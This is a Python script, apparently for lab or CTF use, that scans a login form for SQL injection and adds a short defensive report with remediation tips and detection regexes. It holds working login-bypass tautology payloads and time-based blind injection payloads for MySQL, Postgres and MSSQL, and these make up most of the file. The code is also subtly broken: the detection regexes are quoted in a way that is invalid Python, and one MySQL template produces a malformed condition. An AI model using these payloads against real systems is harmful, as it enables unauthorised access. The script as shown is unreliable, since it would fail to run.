#!/usr/bin/env python3
"""
sqli_scanner.py

Small SQLi scanner for lab use:
- boolean SQLi checks
- blind/time-based SQLi checks (MySQL/Postgres/MSSQL variants)
- optional comparison between two target backends (vulnerable vs secure)
- simple defensive detection guidance and log output

Usage:
    python3 sqli_scanner.py                # interactive prompts
    python3 sqli_scanner.py --host 10.0.2.15 --port 5000
    python3 sqli_scanner.py --url http://10.0.2.15:5000/login.php
    python3 sqli_scanner.py --url http://10.0.2.15:5000/login.php --compare http://10.0.2.20:5000/login.php
"""

import argparse
import json
import sys
import time
import re
from urllib.parse import urljoin
import requests
from requests.exceptions import RequestException, ConnectTimeout, ReadTimeout, ConnectionError

DEFAULT_TIMEOUT = 6  # seconds
SLEEP_SECONDS = 5    # how long the time-based payloads ask DB to sleep
LOGFILE = "sqli_scan_results.json"

# --- Payloads ---
BOOLEAN_PAYLOADS = [
    {"desc": "Classic OR true", "username": "alice' OR '1'='1' -- -", "password": "x"},
    {"desc": "Numeric OR true", "username": "alice' OR 1=1 -- -", "password": "x"},
    {"desc": "Tautology double quote", "username": "\" OR \"\" = \"", "password": "x"},
]

# time-based payload templates for different DBs. The scanner will try each.
TIME_PAYLOADS = [
    # MySQL: IF(condition, SLEEP(n), 0)
    {"db": "mysql", "template": "alice' OR IF({COND}, SLEEP({N}), 0) -- -"},
    # MySQL alternative
    {"db": "mysql", "template": "alice' OR (SELECT IF(1={COND}, SLEEP({N}), 0)) -- -"},
    # Postgres: CASE WHEN condition THEN pg_sleep(n) ELSE pg_sleep(0) END
    {"db": "postgres", "template": "alice' OR (SELECT CASE WHEN {COND} THEN pg_sleep({N}) ELSE pg_sleep(0) END) -- -"},
    # MSSQL: WAITFOR DELAY '0:00:N' (note string formatting)
    {"db": "mssql", "template": "alice' OR (SELECT CASE WHEN {COND} THEN 1 ELSE 0 END); WAITFOR DELAY '0:00:{N}' -- -"},
    # Generic boolean time using benchmark() (some MySQL installs)
    {"db": "mysql-benchmark", "template": "alice' OR (SELECT benchmark({N}00000,MD5(1))) -- -"},
]

SQL_ERROR_REGEXES = [
    r"SQL syntax",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"ORA-",
    r"PG::",
    r"syntax error at or near",
    r"SQLSTATE",
    r"Warning: mysql_",
    r"Unhandled Exception",
]

# --- Helpers ---
def build_url_from_host(host, port, path="/login.php"):
    if host.startswith("http://") or host.startswith("https://"):
        return host if path == "" else urljoin(host, path)
    else:
        return f"http://{host}:{port}{path}"

def prompt_if_missing(args):
    if not args.url:
        host = args.host or input("Target host or IP (e.g. 10.0.2.15): ").strip()
        port = args.port or input("Target port (e.g. 5000): ").strip()
        try:
            port = int(port)
        except:
            print("Invalid port; using 80")
            port = 80
        args.url = build_url_from_host(host, port, args.path)
    return args

def save_results(results):
    with open(LOGFILE, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[+] Results saved to {LOGFILE}")

def baseline_request(session, url, timeout=DEFAULT_TIMEOUT):
    """Fetch baseline page (no payload)"""
    try:
        t0 = time.time()
        r = session.post(url, data={"username": "normaluser", "password": "normalpass"}, timeout=timeout, allow_redirects=True)
        dt = time.time() - t0
        return {
            "status": r.status_code,
            "length": len(r.text),
            "text_sample": r.text[:1000],
            "time": dt,
            "headers": dict(r.headers)
        }
    except Exception as e:
        return {"error": str(e)}

def contains_sql_error(text):
    if not text:
        return False
    for rx in SQL_ERROR_REGEXES:
        if re.search(rx, text, re.IGNORECASE):
            return True
    return False

# --- Tests ---
def test_boolean_sqli(session, url, timeout=DEFAULT_TIMEOUT):
    results = []
    base = baseline_request(session, url, timeout)
    if "error" in base:
        return {"error": f"Baseline error: {base['error']}"}
    for p in BOOLEAN_PAYLOADS:
        try:
            t0 = time.time()
            r = session.post(url, data={"username": p["username"], "password": p["password"]}, timeout=timeout, allow_redirects=True)
            dt = time.time() - t0
            body = r.text or ""
            indicator = {
                "desc": p["desc"],
                "payload": p["username"],
                "status": r.status_code,
                "length": len(body),
                "time": dt,
                "likely_success": False,
                "sql_error_found": contains_sql_error(body)
            }
            # Heuristics: different response length or presence of keywords suggests success
            if indicator["length"] != base["length"]:
                # if length changes significantly, flag
                if abs(indicator["length"] - base["length"]) > max(20, 0.05 * base["length"]):
                    indicator["likely_success"] = True
            # also keyword check
            for kw in ("welcome", "dashboard", "logout", "profile", "admin"):
                if kw in body.lower():
                    indicator["likely_success"] = True
            results.append(indicator)
        except ConnectTimeout:
            results.append({"desc": p["desc"], "error": "connect timeout"})
        except ReadTimeout:
            results.append({"desc": p["desc"], "error": "read timeout"})
        except RequestException as e:
            results.append({"desc": p["desc"], "error": str(e)})
    return {"baseline": base, "tests": results}

def test_time_sqli(session, url, timeout=DEFAULT_TIMEOUT, sleep_seconds=SLEEP_SECONDS):
    """
    For each time-based payload template, test:
      - baseline response time
      - payload with condition TRUE (should delay)
      - payload with condition FALSE (should not delay)
    """
    result = {"baseline": None, "tests": []}
    base = baseline_request(session, url, timeout)
    if "error" in base:
        return {"error": f"Baseline error: {base['error']}"}
    result["baseline"] = base
    for tpl in TIME_PAYLOADS:
        db = tpl["db"]
        templ = tpl["template"]
        testspec = {"db": db, "template": templ, "attempts": []}
        # Create two payloads: TRUE and FALSE conditions. We use simple 1=1 and 1=0 placeholders.
        for cond_val, cond_desc in [("1=1", "true"), ("1=0", "false")]:
            payload_username = templ.format(COND=cond_val, N=sleep_seconds)
            try:
                t0 = time.time()
                r = session.post(url, data={"username": payload_username, "password": "x"}, timeout=timeout + sleep_seconds + 2, allow_redirects=True)
                dt = time.time() - t0
                testspec["attempts"].append({
                    "cond": cond_desc,
                    "payload": payload_username if len(payload_username) < 500 else payload_username[:500] + "...",
                    "status": r.status_code,
                    "time": dt,
                    "length": len(r.text),
                    "sql_error_found": contains_sql_error(r.text)
                })
            except ConnectTimeout:
                testspec["attempts"].append({"cond": cond_desc, "error": "connect timeout"})
            except ReadTimeout:
                testspec["attempts"].append({"cond": cond_desc, "error": "read timeout"})
            except RequestException as e:
                testspec["attempts"].append({"cond": cond_desc, "error": str(e)})
        # Interpret: if true-cond time is significantly larger than false-cond and baseline, it's likely vulnerable
        try:
            true_time = next(a["time"] for a in testspec["attempts"] if a.get("cond") == "true")
            false_time = next(a["time"] for a in testspec["attempts"] if a.get("cond") == "false")
            baseline_time = base["time"]
            testspec["likely_time_sqli"] = (true_time - false_time) > (sleep_seconds * 0.6)
            testspec["details"] = {
                "true_time": true_time,
                "false_time": false_time,
                "baseline_time": baseline_time
            }
        except StopIteration:
            testspec["likely_time_sqli"] = False
            testspec["details"] = {}
        result["tests"].append(testspec)
    return result

# --- Comparison between two URLs ---
def compare_targets(url_a, url_b, timeout=DEFAULT_TIMEOUT):
    """Run a subset of tests against both targets and compare outputs."""
    session = requests.Session()
    session.headers.update({"User-Agent": "SQLi-Scanner/1.0"})
    # run boolean and time tests for each
    print(f"[+] Gathering results for A: {url_a}")
    a_bool = test_boolean_sqli(session, url_a, timeout)
    a_time = test_time_sqli(session, url_a, timeout)
    print(f"[+] Gathering results for B: {url_b}")
    b_bool = test_boolean_sqli(session, url_b, timeout)
    b_time = test_time_sqli(session, url_b, timeout)
    return {"A": {"url": url_a, "boolean": a_bool, "time": a_time},
            "B": {"url": url_b, "boolean": b_bool, "time": b_time}}

# --- Defensive detection / report building ---
def build_defensive_report(scan_results):
    """
    Create a simple defensive report:
    - highlight suspicious responses and timings
    - propose log detection regexes / alert rules
    """
    alerts = []
    for t in scan_results.get("tests", []) if isinstance(scan_results, dict) else []:
        pass  # placeholder - not used here

    # Generic guidance based on scan outcomes
    guidance = {
        "summary": "Automated defensive report (lab guidance). Review WAF and parameterized queries.",
        "suggestions": [
            "Use parameterized queries / prepared statements for all DB access.",
            "Do not echo raw SQL errors to users. Mask database errors in production.",
            "Implement Web Application Firewall (WAF) rules to block SQLi patterns, but don't rely solely on WAF.",
            "Rate-limit login attempts and POST submission rates.",
            "Enable application logging of suspicious inputs (store payload, source IP, timestamp) with redaction policy."
        ],
        "detection_rules": [
            {
                "name": "SQLi_error_signature",
                "regex": r\"\"\"(?i)(?:SQL syntax|mysql_fetch|ORA-|syntax error at or near|PG::|SQLSTATE)\"\"\",
                "description": "Log entries matching DB error text; trigger an alert for repeated occurrences."
            },
            {
                "name": "Time_based_delay_detector",
                "logic": "If the same source IP causes repeated requests where response_time > baseline + 4 seconds, flag as possible blind SQLi timing probe.",
                "threshold_seconds": SLEEP_SECONDS * 0.6
            },
            {
                "name": "Tautology_payload_detector",
                "regex": r\"\"\"(?i)(\bor\b\s*1=1|\b' or '1'='1|\b\" or \"\" = \"\")\"\"\",
                "description": "Detect common tautology payloads in POST parameters."
            }
        ]
    }
    return guidance

# --- CLI / Main ---
def main():
    parser = argparse.ArgumentParser(description="Lightweight SQLi scanner for lab/CTF use.")
    parser.add_argument("--host", help="Target host (IP) without scheme, e.g. 10.0.2.15", default=None)
    parser.add_argument("--port", help="Target port, e.g. 5000", type=int, default=None)
    parser.add_argument("--url", help="Full URL to login endpoint (e.g. http://10.0.2.15:5000/login.php)", default=None)
    parser.add_argument("--path", help="Path if using host+port, default /login.php", default="/login.php")
    parser.add_argument("--compare", help="Optional second target URL to compare against (secure backend)", default=None)
    parser.add_argument("--timeout", help="Request timeout seconds", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--sleep", help="Seconds to use for time-based payloads", type=int, default=SLEEP_SECONDS)
    args = parser.parse_args()

    args = prompt_if_missing(args)
    target = args.url
    compare_target = args.compare

    print("[*] Target:", target)
    if compare_target:
        print("[*] Compare target:", compare_target)

    session = requests.Session()
    session.headers.update({"User-Agent": "SQLi-Scanner/1.0"})

    overall = {"target": target, "compare": compare_target, "boolean": None, "time": None, "comparison": None, "defensive": None}
    try:
        print("[*] Running boolean SQLi checks...")
        overall["boolean"] = test_boolean_sqli(session, target, timeout=args.timeout)
        print("[*] Running time-based SQLi checks...")
        overall["time"] = test_time_sqli(session, target, timeout=args.timeout, sleep_seconds=args.sleep)

        if compare_target:
            overall["comparison"] = compare_targets(target, compare_target, timeout=args.timeout)

        overall["defensive"] = build_defensive_report(overall)

        # Print brief summarized results
        print("\n=== SUMMARY ===")
        # boolean summary
        if isinstance(overall["boolean"], dict) and "tests" in overall["boolean"]:
            for t in overall["boolean"]["tests"]:
                status = t.get("likely_success", False)
                print(f" - BOOLEAN: {t['desc']:25} | likely_success={status} | length={t.get('length')} | status={t.get('status')}")
        # time summary
        if isinstance(overall["time"], dict) and "tests" in overall["time"]:
            for t in overall["time"]["tests"]:
                print(f" - TIME: {t['db']:10} | likely_time_sqli={t.get('likely_time_sqli')} | details={t.get('details')}")

        # Defensive guidance
        print("\n=== DEFENSIVE GUIDANCE ===")
        for s in overall["defensive"]["suggestions"]:
            print(" -", s)

        # Saving results
        save_results(overall)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        save_results(overall)
    except Exception as e:
        print("[!] Unexpected error:", e)
        save_results(overall)

if __name__ == "__main__":
    main()
